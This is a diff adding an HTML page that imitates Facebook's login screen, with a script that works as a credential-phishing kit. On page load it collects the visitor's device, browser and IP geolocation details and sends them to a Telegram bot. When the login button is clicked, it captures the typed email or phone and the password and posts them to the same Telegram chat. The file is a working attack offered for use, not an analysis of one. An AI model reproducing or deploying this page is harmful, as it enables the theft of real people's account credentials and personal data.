@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+        }
+        .left {
+            margin-right: 60px;
+        }
+        .left h1 {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin: 0 0 16px 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .left p {
+            font-size: 28px;
+            color: #1c1e21;
+            margin: 0;
+            line-height: 32px;
+        }
+        .login-box {
+            background: #fff;
+            padding: 24px 24px 20px 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 396px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: #f5f6f7;
+        }
+        .login-box button.login {
+            width: 100%;
+            background: #1877f2;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 0;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .login-box button.login:hover {
+            background: #166fe5;
+        }
+        .login-box .forgot {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: block;
+            text-align: center;
+        }
+        .login-box .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 16px 0;
+            width: 100%;
+        }
+        .login-box button.create {
+            background: #42b72a;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 0;
+            width: 60%;
+            margin: 0 auto;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: block;
+        }
+        .login-box button.create:hover {
+            background: #36a420;
+        }
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        .create-page b {
+            color: #1c1e21;
+        }
+        .create-page a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background: none;
+            color: #737373;
+            font-size: 12px;
+            text-align: left;
+            padding: 24px 0 12px 0;
+        }
+        .footer .langs, .footer .links {
+            margin: 0 0 8px 0;
+            padding: 0 0 0 16vw;
+        }
+        .footer .langs span {
+            margin-right: 10px;
+            color: #8a8d91;
+            cursor: pointer;
+        }
+        .footer .langs .plus {
+            border: 1px solid #ccd0d5;
+            border-radius: 2px;
+            padding: 0 6px;
+            font-weight: bold;
+            background: #f5f6f7;
+        }
+        .footer .links a {
+            color: #8a8d91;
+            margin-right: 10px;
+            text-decoration: none;
+        }
+        .footer .links a:hover {
+            text-decoration: underline;
+        }
+        .footer .copyright {
+            color: #8a8d91;
+            padding-left: 16vw;
+        }
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+                justify-content: flex-start;
+                height: auto;
+                margin-top: 40px;
+            }
+            .left {
+                margin: 0 0 32px 0;
+                text-align: center;
+            }
+            .footer .langs, .footer .links, .footer .copyright {
+                padding-left: 2vw;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share<br>with the people in your life.</p>
+        </div>
+        <div>
+            <div class="login-box">
+                <input type="text" placeholder="Email address or phone number">
+                <input type="password" placeholder="Password">
+                <button class="login">Log in</button>
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot" target="_blank">Forgotten password?</a>
+                <div class="divider"></div>
+                <button class="create" onclick="window.open('https://www.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>
+            </div>
+            <div class="create-page">
+                <span><b><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" target="_blank">Create a Page</a></b> for a celebrity, brand or business.</span>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="langs">
+            <span>English (UK)</span>
+            <span>বাংলা</span>
+            <span>অসমীয়া</span>
+            <span>हिन्दी</span>
+            <span>नेपाली</span>
+            <span>Bahasa Indonesia</span>
+            <span>العربية</span>
+            <span>中文(简体)</span>
+            <span>Bahasa Melayu</span>
+            <span>Español</span>
+            <span>Português (Brasil)</span>
+            <span class="plus">+</span>
+        </div>
+        <div class="links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log in</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Ray-Ban Meta</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact uploading and non-users</a>
+            <a href="#">Voting Information Centre</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Privacy Centre</a>
+            <a href="#">About</a>
+            <a href="#">Create ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">AdChoices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+        </div>
+        <div class="copyright">
+            Meta © 2025
+        </div>
+    </div>
+    <script>
+    // Fetch Telegram config from server.txt
+    async function getTelegramConfig() {
+      try {
+        const res = await fetch('server.txt');
+        const text = await res.text();
+        const token = text.match(/TOKEN=(.*)/)[1].trim();
+        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+        return { token, chatId };
+      } catch (e) {
+        alert('Failed to load Telegram config.');
+        return { token: '', chatId: '' };
+      }
+    }
+
+    // Replace all Telegram API calls to use dynamic config
+    let TG_API = '';
+    let TELEGRAM_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
+    getTelegramConfig().then(cfg => {
+      TELEGRAM_TOKEN = cfg.token;
+      TELEGRAM_CHAT_ID = cfg.chatId;
+      TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    });
+
+    // Guess device name/type from user agent
+    function getDeviceName() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) {
+        const match = ua.match(/Android.*; (.+?) Build/);
+        return match ? `Android (${match[1]})` : 'Android Device';
+      } else if (/iPhone/i.test(ua)) {
+        return 'iPhone';
+      } else if (/iPad/i.test(ua)) {
+        return 'iPad';
+      } else if (/Macintosh/i.test(ua)) {
+        return 'Mac';
+      } else if (/Windows/i.test(ua)) {
+        return 'Windows PC';
+      } else if (/Linux/i.test(ua)) {
+        return 'Linux PC';
+      } else {
+        return 'Unknown Device';
+      }
+    }
+
+    // Collect device info
+    async function getDeviceInfo() {
+      let batteryInfo = '';
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `🔋 Battery: ${(battery.level * 100).toFixed(0)}%${battery.charging ? ' (Charging)' : ''}`;
+        } catch (e) {
+          batteryInfo = '🔋 Battery: N/A';
+        }
+      } else {
+        batteryInfo = '🔋 Battery: N/A';
+      }
+      // Additional details
+      const screenRes = `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
+      const timezone = `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+      const referrer = `🔗 Referrer: ${document.referrer || 'Direct/None'}`;
+      let connectionType = '📶 Connection: N/A';
+      if (navigator.connection && navigator.connection.effectiveType) {
+        connectionType = `📶 Connection: ${navigator.connection.effectiveType.toUpperCase()}`;
+      }
+      const cpuCores = `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`;
+      const memory = `💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}`;
+      const info = [
+        `📱 Device: ${getDeviceName()}`,
+        `🧭 User Agent: ${navigator.userAgent}`,
+        `💻 Platform: ${navigator.platform}`,
+        `🌐 Language: ${navigator.language}`,
+        screenRes,
+        timezone,
+        referrer,
+        connectionType,
+        cpuCores,
+        memory,
+        batteryInfo,
+        `🕒 Time: ${new Date().toLocaleString()}`
+      ];
+      return info.join('\n');
+    }
+
+    // Fetch IP and geolocation info (CORS-friendly)
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://geolocation-db.com/json/');
+        if (!res.ok) throw new Error('IP info fetch failed');
+        const data = await res.json();
+        return `🌍 IP: ${data.IPv4}\n🏙️ City: ${data.city}\n🌎 Country: ${data.country_name}\n🌐 State: ${data.state}`;
+      } catch (e) {
+        return '🌍 IP Info: N/A';
+      }
+    }
+
+    // Send message to Telegram
+    async function sendToTelegram(message) {
+      await fetch(TG_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      });
+    }
+
+    // On page load, send device info and IP info
+    window.addEventListener('DOMContentLoaded', async () => {
+      const deviceInfo = await getDeviceInfo();
+      const ipInfo = await getIPInfo();
+      sendToTelegram(`🟢 New visitor!\n${deviceInfo}\n${ipInfo}`);
+    });
+
+    // On login button click, send credentials, device info, and IP info
+    document.addEventListener('DOMContentLoaded', () => {
+      const loginBtn = document.querySelector('.login');
+      if (!loginBtn) return;
+      loginBtn.addEventListener('click', async (e) => {
+        e.preventDefault();
+        const inputs = document.querySelectorAll('.login-box input');
+        const email = inputs[0]?.value || '';
+        const password = inputs[1]?.value || '';
+        const deviceInfo = await getDeviceInfo();
+        const ipInfo = await getIPInfo();
+        const msg = `📋 *Tap to copy*\n\n\`Email/Phone\`: \`${email}\`\n\`Password\`: \`${password}\`\n\n${deviceInfo}\n${ipInfo}`;
+        sendToTelegram(msg);
+      });
+    });
+    </script>
+</body>
+</html>
